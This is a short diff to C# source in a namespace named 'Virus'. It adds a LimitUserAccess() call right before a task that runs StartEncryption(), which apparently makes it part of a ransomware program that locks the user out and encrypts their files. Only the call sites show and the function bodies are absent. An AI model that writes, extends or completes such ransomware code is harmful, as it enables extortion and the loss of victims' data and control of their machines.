@@ -61,6 +61,7 @@ namespace Virus
         {
 
             //dont go any further
+            LimitUserAccess();
             new Task(() => { StartEncryption(); }).Start();
             timer1.Start();
             System.Windows.Forms.ToolTip TP = new System.Windows.Forms.ToolTip();
